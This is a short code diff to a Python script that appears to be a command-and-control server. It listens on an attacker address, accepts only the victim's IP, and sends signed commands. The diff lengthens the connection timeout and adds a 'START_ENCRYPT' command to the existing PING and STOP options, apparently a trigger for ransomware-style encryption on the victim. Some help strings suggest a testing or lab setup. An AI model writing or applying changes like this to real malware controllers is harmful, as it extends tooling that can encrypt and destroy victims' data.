@@ -20,7 +20,7 @@ def serve_once(command, unsigned=False):
         print(f"C2 listening on {ATTACKER_IP}:{C2_PORT}; auth={AUTH_MODE}", flush=True)
         connection, peer = server.accept()
         with connection:
-            connection.settimeout(10)
+            connection.settimeout(60)
             if peer[0] != VICTIM_IP:
                 raise ValueError(f"Unexpected C2 client: {peer[0]}")
             connection.sendall(pack(command, signed=not unsigned))
@@ -77,7 +77,7 @@ def serve_relay_once():
 
 def main():
     parser = argparse.ArgumentParser(description=__doc__)
-    parser.add_argument("--cmd", choices=("PING", "STOP"), default="PING")
+    parser.add_argument("--cmd", choices=("PING", "STOP", "START_ENCRYPT"), default="PING")
     parser.add_argument("--unsigned", action="store_true", help="Test unsigned-command rejection")
     parser.add_argument("--relay-demo", action="store_true", help="Accept a separate dry-run STOP sender")
     args = parser.parse_args()
